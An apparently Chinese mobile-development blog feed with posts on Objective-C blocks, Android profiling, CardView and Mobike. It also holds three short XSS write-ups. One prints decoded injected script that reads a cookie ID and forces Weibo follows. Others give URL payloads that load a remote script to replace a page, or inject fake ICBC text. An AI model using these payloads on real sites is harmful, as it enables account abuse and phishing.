<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[移动开发技术]]></title>
  <link href="http://jason5.cn/atom.xml" rel="self"/>
  <link href="http://jason5.cn/"/>
  <updated>2017-06-16T15:45:15+08:00</updated>
  <id>http://jason5.cn/</id>
  <author>
    <name><![CDATA[jason]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[转]到底什么时候才需要在ObjC的Block中使用weakSelf/strongSelf]]></title>
    <link href="http://jason5.cn/blog/zhuan-dao-di-shi-yao-shi-hou-cai-xu-yao-zai-objcde-blockzhong-shi-yong-weakself-slash-strongself.html"/>
    <updated>2017-06-16T15:01:32+08:00</updated>
    <id>http://jason5.cn/blog/zhuan-dao-di-shi-yao-shi-hou-cai-xu-yao-zai-objcde-blockzhong-shi-yong-weakself-slash-strongself</id>
    <content type="html"><![CDATA[<p>Objective C 的 Block 是一个很实用的语法，特别是与GCD结合使用，可以很方便地实现并发、异步任务。但是，如果使用不当，Block 也会引起一些循环引用问题(retain cycle)—— Block 会 retain ‘self’，而 ‘self‘ 又 retain 了 Block。因为在 ObjC 中，直接调用一个实例变量，会被编译器处理成 ‘self->theVar’，’self’ 是一个 strong 类型的变量，引用计数会加 1，于是，self retains queue， queue retains block，block retains self。</p>

<!--more-->


<h2>解决 retain circle1</h2>

<p>Apple 官方的建议是，传进 Block 之前，把 ‘self’ 转换成 weak automatic 的变量，这样在 Block 中就不会出现对 self 的强引用。如果在 Block 执行完成之前，self 被释放了，weakSelf 也会变为 nil。</p>

<p>示例代码：</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>__weak __typeof__(self) weakSelf = self;
</span><span class='line'>dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
</span><span class='line'>    [weakSelf doSomething];
</span><span class='line'>});</span></code></pre></td></tr></table></div></figure>


<p>clang 的文档表示，在 doSomething 内，weakSelf 不会被释放。但，下面的情况除外：</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>__weak __typeof__(self) weakSelf = self;
</span><span class='line'>    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
</span><span class='line'>    [weakSelf doSomething];
</span><span class='line'>    [weakSelf doOtherThing];
</span><span class='line'>});</span></code></pre></td></tr></table></div></figure>


<p>在 doSomething 中，weakSelf 不会变成 nil，不过在 doSomething 执行完成，调用第二个方法 doOtherThing 的时候，weakSelf 有可能被释放，于是，strongSelf 就派上用场了：</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>__weak __typeof__(self) weakSelf = self;
</span><span class='line'>    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
</span><span class='line'>    __strong __typeof(self) strongSelf = weakSelf;
</span><span class='line'>    [strongSelf doSomething];
</span><span class='line'>    [strongSelf doOtherThing];
</span><span class='line'>});</span></code></pre></td></tr></table></div></figure>


<p>__strong 确保在 Block 内，strongSelf 不会被释放。</p>

<h2>总结</h2>

<ul>
<li>在 Block 内如果需要访问 self 的方法、变量，建议使用 weakSelf。</li>
<li>如果在 Block 内需要多次 访问 self，则需要使用 strongSelf。</li>
</ul>


<h2>参考</h2>

<ul>
<li><a href="https://dhoerl.wordpress.com/2013/04/23/i-finally-figured-out-weakself-and-strongself">I finally figured out weakSelf and strongSelf</a></li>
<li><a href="https://stackoverflow.com/questions/21113963/is-the-weakself-strongself-dance-really-necessary-when-referencing-self-inside-a?rq=1">Is the weakSelf/strongSelf dance really necessary when referencing self inside a non-retained completion called from a UIViewController?</a></li>
</ul>


<blockquote><p> 原文链接： <a href="http://blog.lessfun.com/blog/2014/11/22/when-should-use-weakself-and-strongself-in-objc-block/">http://blog.lessfun.com/blog/2014/11/22/when-should-use-weakself-and-strongself-in-objc-block/</a></p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Mobike体验续]]></title>
    <link href="http://jason5.cn/blog/mobiketi-yan-xu.html"/>
    <updated>2016-11-15T14:49:07+08:00</updated>
    <id>http://jason5.cn/blog/mobiketi-yan-xu</id>
    <content type="html"><![CDATA[<p>这两天出差全靠mobike了，总共骑了大概有10趟吧，lite版的单车骑着确实轻松不少，价钱还更便宜。</p>

<p>昨天去了陆家嘴，逛了ifc，在黄浦江边吹了下风，是个好大上的地方。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Mobike体验]]></title>
    <link href="http://jason5.cn/blog/mobiketi-yan.html"/>
    <updated>2016-11-13T21:25:26+08:00</updated>
    <id>http://jason5.cn/blog/mobiketi-yan</id>
    <content type="html"><![CDATA[<p>今天到上海出差，第一次来，想到处随意逛逛，单车是个很不错的选择，所以注册了mobike。</p>

<p>今天骑了三段：</p>

<p>第一段2km，耗时19m。这一段主要是在上海交大校园里，人少路况好，体验非常不错。</p>

<p>第二段3km，耗时22m。这一段是从酒店去外滩，在半路上被交警拦下，有一段路不准骑车，于是改乘地铁。这一段由于是在马路上，没有专门的自行车道，骑行感受一般。不过最难忍受的是这个车骑久了不舒服，座位对我来说比较偏矮，发不上力，且久了容易酸，下地铁台阶的时候感觉都快跪下去了。</p>

<p>第三段7km，耗时49m。从南京路步行街到酒店。跟第二段类似，没有专用自行车道，不停在人行道和马路边缘穿行，影响骑行速度。这次我骑得比较慢，也可能更适应了，腿酸的感受稍微弱一点。</p>

<p>总体感受：
1. 方便，随停真的是太方便了，完全不操心。
2. 用的人挺多的，上海和深圳都是这样。
3. lite版单车还比较少，一般附近难以找到，看起来可能会好骑一点，因为更轻，还没有体验过。
4. app做得不错，功能简洁易用，单车定位比较准。
5. 在北京这种有专用自行车道的城市，发展会更好，而对于没有骑行环境的城市，例如重庆，基本就搞不起来了。</p>

<p>经过今天的体验，总体来讲感觉不错，从最以前的完全不看好，到现在觉得稍微觉得有戏。以后有需要会继续用。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[利用traceview优化Android应用流畅度]]></title>
    <link href="http://jason5.cn/blog/li-yong-traceviewyou-hua-androidying-yong-liu-chang-du.html"/>
    <updated>2016-08-03T18:19:30+08:00</updated>
    <id>http://jason5.cn/blog/li-yong-traceviewyou-hua-androidying-yong-liu-chang-du</id>
    <content type="html"><![CDATA[<p>众所周知，屏幕刷新频率必须要达到60Hz，人眼才能感觉不到界面的卡顿。60Hz意味着界面每一帧的计算加渲染时间不能超过16ms，当某些业务逻辑比较耗时的时候，执行时间可能超过16ms的阈值，这时候给用户直观的感受就是界面卡顿。</p>

<p>traceview是安卓sdk提供的一个性能分析工具，能够收集函数的执行时间，以精确的分析系统的瓶颈所在。当我们遇到系统卡顿问题的时候，可以利用这个工具来进行分析。下边的篇幅就项目中一个真实的卡顿问题，来介绍traceview工具的使用。</p>

<!--more-->


<p>在项目中遇到一个问题，滑动卡片的时候界面会出现卡顿，效果如下：</p>

<p><a href="http://jason5.cn/images/traceview_performance_before.gif"><img src="http://jason5.cn/images/traceview_performance_before.gif" alt="" /></a></p>

<p>可以明显看到，卡片滑动的最后是有卡顿的，突然一下新的卡片就划进来了，中间的动画过程有缺失。</p>

<p>利用Android手机的自带工具，可以有更清楚的认识。开发者选项->GPU呈现模式分析，打开后，可以在屏幕上看到每一帧动画的耗时。</p>

<p><a href="http://jason5.cn/images/EA295EE4-3A8A-42DF-9D4A-09498FE9F120.png"><img src="http://jason5.cn/images/EA295EE4-3A8A-42DF-9D4A-09498FE9F120.png" alt="" /></a></p>

<p>打开这个选项后，再操作手机，手机屏幕底下会出现一些柱形的图块，横坐标代表动画的每一帧，纵坐标代表这一帧的耗时，柱子的高度超过了绿色线就代表这一帧的耗时超过了16ms，会造成卡顿。我们没滑动一次卡片，就会发现一个远高于绿色线的柱状图形出现，也就是造成了卡顿。</p>

<p>上边只是定性的分析了为什么会造成卡顿，那怎么定量的分析呢，这时候traceview工具就派上用场了。</p>

<p>点击Android Studio上边的机器人小图标“Android Device Monitor”，再切换到DDMS，左边的面板上选择需要调试的进程，然后点击Start Method Profiling按钮，这时候工具开始对方法耗时进行记录。操作手机，滑动卡片后，再点击Stop Method Profiling按钮，这时候面板会呈现出记录期间每个函数执行的耗时。</p>

<p><a href="http://jason5.cn/images/traceview-performace-example.png"><img src="http://jason5.cn/images/traceview-performace-example.png" alt="" /></a></p>

<p>最需要关注的数据是下边这张图</p>

<p><a href="http://jason5.cn/images/A9F7C9CF-3B77-4B90-9B27-D679346AA0C51111.png"><img src="http://jason5.cn/images/A9F7C9CF-3B77-4B90-9B27-D679346AA0C5.png" alt="" /></a></p>

<p>每一列的含义如下图</p>

<p><a href="http://jason5.cn/images/A0239545-85FA-459E-BD42-30D0B946453B.png"><img src="http://jason5.cn/images/A0239545-85FA-459E-BD42-30D0B946453B.png" alt="" /></a></p>

<p>经过分析可以发现，notifyDataSetChanged这个函数执行时间为53.141ms，超过了要求的16ms阈值，所以问题就定位到这里了。解决方法的话，就比较简单了，想办法在切换卡片的时候去掉调用Adapter的notifyDataSetChanged调用，这里其实只是业务逻辑的修改优化。</p>

<p>优化后的效果，可以看到，再次切换的时候，已经几乎都在16ms以下。</p>

<p><a href="http://jason5.cn/images/9D18BF07-7CAE-40C4-B585-08392D41BF64.png"><img src="http://jason5.cn/images/9D18BF07-7CAE-40C4-B585-08392D41BF64.png" alt="" /></a></p>

<p>优化后的动态效果图</p>

<p><a href="http://jason5.cn/images/traceview_performance_after.gif"><img src="http://jason5.cn/images/traceview_performance_after.gif" alt="" /></a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[存储型XSS应用-微博刷粉]]></title>
    <link href="http://jason5.cn/blog/xssying-yong-wei-bo-shua-fen.html"/>
    <updated>2016-08-03T11:34:13+08:00</updated>
    <id>http://jason5.cn/blog/xssying-yong-wei-bo-shua-fen</id>
    <content type="html"><![CDATA[<p>目前腾讯监控系统发现space.aili.com存在大量恶意的请求，通过xxx.qq.com以期望达到刷微博粉丝的效果</p>

<!--more-->


<p>被插入代码截图如下（每个页面都有，框架被修改）</p>

<p><img src="http://jason5.cn/images/xss-weibo1.png" alt="" /></p>

<p>被插入的恶意代码为：</p>

<p><img src="http://jason5.cn/images/xss-weibo3.png" alt="" /></p>

<p>解码后为:</p>

<p><img src="http://jason5.cn/images/xss-weibo4.png" alt="" /></p>

<p>格式化</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">window</span><span class="p">.</span><span class="nx">u</span> <span class="o">=</span> <span class="s2">&quot;chunxi_lu&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nb">window</span><span class="p">.</span><span class="nx">mm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;div&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">window</span><span class="p">.</span><span class="nx">mm</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&quot;&lt;iframe style=&#39;display:none&#39; name=&#39;mj&#39;&gt;&lt;/iframe&gt;&lt;form method=&#39;POST&#39; id=&#39;mi&#39; action=&#39;http://radio.t.qq.com/mini/follow.php&#39; target=&#39;mj&#39;&gt;&lt;input type=&#39;hidden&#39; value=&#39;&quot;</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">u</span> <span class="o">+</span> <span class="s2">&quot;&#39; name=&#39;u&#39;/&gt;&lt;input type=&#39;hidden&#39; value=&#39;&quot;</span> <span class="o">+</span> <span class="p">((</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/(?:^|\s)uin=o(\d+)/</span><span class="p">)</span> <span class="o">||</span> <span class="p">[</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">])[</span><span class="mi">1</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;&#39; name=&#39;uin&#39;/&gt;&lt;/form&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">mm</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;mi&quot;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
</span><span class='line'><span class="p">})()</span>
</span></code></pre></td></tr></table></div></figure>


<p>innerHTML被修改为</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">style</span><span class="o">=</span><span class="s1">&#39;display:none&#39;</span> <span class="nx">name</span><span class="o">=</span><span class="s1">&#39;mj&#39;</span><span class="o">&gt;&lt;</span><span class="err">/iframe&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="s1">&#39;POST&#39;</span> <span class="nx">id</span><span class="o">=</span><span class="s1">&#39;mi&#39;</span> <span class="nx">action</span><span class="o">=</span><span class="s1">&#39;http://radio.t.qq.com/mini/follow.php&#39;</span> <span class="nx">target</span><span class="o">=</span><span class="s1">&#39;mj&#39;</span><span class="o">&gt;</span>
</span><span class='line'>  <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s1">&#39;hidden&#39;</span> <span class="nx">value</span><span class="o">=</span><span class="s1">&#39;&quot; + window.u + &quot;&#39;</span> <span class="nx">name</span><span class="o">=</span><span class="s1">&#39;u&#39;</span> <span class="o">/&gt;</span>
</span><span class='line'>  <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s1">&#39;hidden&#39;</span> <span class="nx">value</span><span class="o">=</span><span class="s1">&#39;&quot; + ((document.cookie.match(/(?:^|\s)uin=o(\d+)/) || [&quot;&quot;, &quot;&quot;])[1] | 0) + &quot;&#39;</span> <span class="nx">name</span><span class="o">=</span><span class="s1">&#39;uin&#39;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="err">/form&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>粉丝数刷到3w+</p>

<p><img src="http://jason5.cn/images/xss-weibo2.png" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DOM XSS]]></title>
    <link href="http://jason5.cn/blog/dom-xss.html"/>
    <updated>2016-08-03T11:04:09+08:00</updated>
    <id>http://jason5.cn/blog/dom-xss</id>
    <content type="html"><![CDATA[<p>因为JavaScript脚本功能强大，我们可以利用它来更改整个页面内容，所以我们就可以制造出利用真的目标域名的假页面</p>

<!--more-->


<p><a href="http://app.2008.qq.com/ppzj/view_dh.php?page=%22%3E%3Cscript%20src%3D%22http%3A%2F%2Fxxxx.com%2Fyy.js%22%3E%3C%2Fscript%3E">http://app.2008.qq.com/ppzj/view_dh.php?page=%22%3E%3Cscript%20src%3D%22http%3A%2F%2Fxxxx.com%2Fyy.js%22%3E%3C%2Fscript%3E</a></p>

<p><img src="http://jason5.cn/images/xss-dom.png" alt="" /></p>

<p>page解码后为</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="s2">&quot;&gt;&lt;script src=&quot;</span><span class="nx">http</span><span class="o">:</span><span class="c1">//xxxx.com/yy.js&quot;&gt;&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>yy.js的内容</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span> <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span><span class="p">(){</span>
</span><span class='line'>  <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">title</span><span class="o">=</span><span class="s2">&quot;XSS test&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">bgColor</span><span class="o">=</span><span class="s2">&quot;black&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">fgColor</span><span class="o">=</span><span class="s2">&quot;white&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="o">=</span><span class="s2">&quot;&lt;iframe src=&#39;http://www.qqdx.albbz.cn/&#39; width=&#39;100%&#39; height=&#39;100%&#39;&gt;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>原始页面内容
<a href="http://app.2008.qq.com/ppzj/view_dh.php?page=1">http://app.2008.qq.com/ppzj/view_dh.php?page=1</a></p>

<p><img src="http://jason5.cn/images/xss-dom1.png" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[反射型XSS]]></title>
    <link href="http://jason5.cn/blog/fan-she-xing-xss.html"/>
    <updated>2016-08-01T20:18:08+08:00</updated>
    <id>http://jason5.cn/blog/fan-she-xing-xss</id>
    <content type="html"><![CDATA[<p>早时候出现的一个反射型XSS漏洞</p>

<!--more-->


<p>漏洞URL</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://www.icbc.com.cn/news/hotspot.jsp?column=%3Cfont%20size=10%3E%BD%F7%B4%CB%D4%AA%B5%A9%BC%D1%BD%DA%D6%AE%BC%CA%A3%AC%B9%A4%C9%CC%D2%F8%D0%D0%B8%F8%C3%BF%B8%F6%B4%A2%BB%A7%C3%E2%B7%D1%B7%A2%B7%C51000%CD%F2%C3%C0%BD%F0%3C/font%3E</span></code></pre></td></tr></table></div></figure>


<p>URL decode之后</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://www.icbc.com.cn/news/hotspot.jsp?column=&lt;font size=10&gt;谨此元旦佳节之际，工商银行给每个储户免费发放1000万美金&lt;/font&gt;</span></code></pre></td></tr></table></div></figure>


<p>效果
<img src="http://jason5.cn/images/o_ICBC1.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CardView在API 21以下的圆角效果处理]]></title>
    <link href="http://jason5.cn/blog/cardviewzai-api-21yi-xia-de-yuan-jiao-xiao-guo-chu-li.html"/>
    <updated>2016-07-21T19:48:15+08:00</updated>
    <id>http://jason5.cn/blog/cardviewzai-api-21yi-xia-de-yuan-jiao-xiao-guo-chu-li</id>
    <content type="html"><![CDATA[<p>CardView是Android5.0（API 21）加入的新控件，当然，在API 21以下也能用，在build.gradle的依赖里加入下边一行就可以用了</p>

<p><code>
compile 'com.android.support:cardview-v7:23.1.1'
</code></p>

<p>项目中要做一个卡片浏览的程序，卡片需要有5dp的圆角，圆角效果CardView自带属性就可以支持，加上app:cardCornerRadius属性就好了，如下：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;android.support.v7.widget.CardView</span>
</span><span class='line'>  <span class="na">xmlns:android=</span><span class="s">&quot;http://schemas.android.com/apk/res/android&quot;</span>
</span><span class='line'>  <span class="na">xmlns:app=</span><span class="s">&quot;http://schemas.android.com/apk/res-auto&quot;</span>
</span><span class='line'>  <span class="na">android:layout_width=</span><span class="s">&quot;match_parent&quot;</span>
</span><span class='line'>  <span class="na">android:layout_height=</span><span class="s">&quot;wrap_content&quot;</span>
</span><span class='line'>  <span class="na">app:cardUseCompatPadding=</span><span class="s">&quot;true&quot;</span>
</span><span class='line'>  <span class="na">app:cardCornerRadius=</span><span class="s">&quot;5dp&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  ...
</span><span class='line'><span class="nt">&lt;/android.support.v7.widget.CardView&gt;</span>
</span></code></pre></td></tr></table></div></figure>




<!--more-->


<p>在API 21以上（包括）的机器实现了很完美的圆角效果，效果如下：</p>

<p><img src="http://jason5.cn/images/1841176-cc3c3a00ecd691e4.png" alt="" /></p>

<p>但是在API 21以下的机器出现了问题，以下是API 19的实现效果：</p>

<p><img src="http://jason5.cn/images/1841176-edef0454295c6e12.png" alt="" /></p>

<p>初步一看，虽然加上了圆角属性，但是图片边上是方的。将左下角和左上角放大仔细看下：</p>

<p><img src="http://jason5.cn/images/1841176-c40edd84f7c1e6cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /></p>

<p><img src="http://jason5.cn/images/1841176-d504c2a1be51063b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /></p>

<p>可以看到，CardView本身是圆角效果了，但是里边的内容却还是方的，并且出现了多余的白边。
再仔细查看CardView的文档，发现其有一个属性cardPreventCornerOverlap</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'>Add padding to CardView on v20 and before to prevent intersections between the Card content and rounded corners.
</span><span class='line'>在v20和之前的版本中添加内边距，这个属性是为了防止卡片内容和边角的重叠
</span><span class='line'><span class="nt">&lt;attr</span> <span class="na">name=</span><span class="s">&quot;cardPreventCornerOverlap&quot;</span> <span class="na">format=</span><span class="s">&quot;boolean&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure>


<p>cardPreventCornerOverlap默认为true，意思是阻止API 20或者之前的CardView的corner和内部元素重叠。没有重叠就产生了上边的效果，多了一条白边。于是在xml布局文件里增加CardView的属性app:cardPreventCornerOverlap=&ldquo;false"，左下角和左上角效果如下：</p>

<p><img src="http://jason5.cn/images/1841176-2690d1d4c4535311.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /></p>

<p><img src="http://jason5.cn/images/1841176-60dd4cef0a629cc5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /></p>

<p>可以看到，CardView里的元素已经和CardView重叠了，但是元素本身没有圆角，所以顶点伸出去了。到这里思路就很简单了，将里边的元素单独做圆角处理。</p>

<p>drawable下新建shape_radius.xml文件，代码如下：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
</span><span class='line'><span class="nt">&lt;shape</span> <span class="na">xmlns:android=</span><span class="s">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="na">android:shape=</span><span class="s">&quot;rectangle&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;corners</span> <span class="na">android:radius=</span><span class="s">&quot;5dp&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;solid</span> <span class="na">android:color=</span><span class="s">&quot;@color/f2f2f2&quot;</span><span class="nt">&gt;&lt;/solid&gt;</span>
</span><span class='line'><span class="nt">&lt;/shape&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>在CardView里的元素LinearLayout加上backgroud属性</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;LinearLayout</span> <span class="na">android:layout_width=</span><span class="s">&quot;match_parent&quot;</span>
</span><span class='line'>    <span class="na">android:layout_height=</span><span class="s">&quot;match_parent&quot;</span>
</span><span class='line'>    <span class="na">android:orientation=</span><span class="s">&quot;vertical&quot;</span>
</span><span class='line'>    <span class="na">android:background=</span><span class="s">&quot;@drawable/shape_radius&quot;</span> <span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;ImageView</span>
</span><span class='line'>      <span class="na">android:id=</span><span class="s">&quot;@+id/iv_header&quot;</span>
</span><span class='line'>      <span class="na">android:layout_width=</span><span class="s">&quot;match_parent&quot;</span>
</span><span class='line'>      <span class="na">android:layout_height=</span><span class="s">&quot;wrap_content&quot;</span>
</span><span class='line'>      <span class="na">android:layout_gravity=</span><span class="s">&quot;center_horizontal&quot;</span>
</span><span class='line'>      <span class="na">android:adjustViewBounds=</span><span class="s">&quot;true&quot;</span>
</span><span class='line'>      <span class="na">android:scaleType=</span><span class="s">&quot;fitCenter&quot;</span>
</span><span class='line'>      <span class="na">android:src=</span><span class="s">&quot;@drawable/ic_person_default&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;/LinearLayout&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>左下角正常，左上角依然</p>

<p><img src="http://jason5.cn/images/1841176-cf5c737487884d83.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /></p>

<p><img src="http://jason5.cn/images/1841176-a6f1a4ab15d9850c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /></p>

<p>图片还需要单独做圆角处理，这里需要的效果是，图片的上边两个角需要圆角，下边两个角需要直角。
自定义UpRoundImageView类，继承自ImageView，专门做圆角的绘制，代码如下：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">UpRoundImageView</span> <span class="kd">extends</span> <span class="n">ImageView</span> <span class="o">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">private</span> <span class="kt">float</span> <span class="n">mRadus</span> <span class="o">=</span> <span class="mi">5</span> <span class="o">*</span> <span class="n">SystemUtils</span><span class="o">.</span><span class="na">getDensity</span><span class="o">(</span><span class="n">CampusApplication</span><span class="o">.</span><span class="na">getCampusApplicationContext</span><span class="o">());</span>
</span><span class='line'>
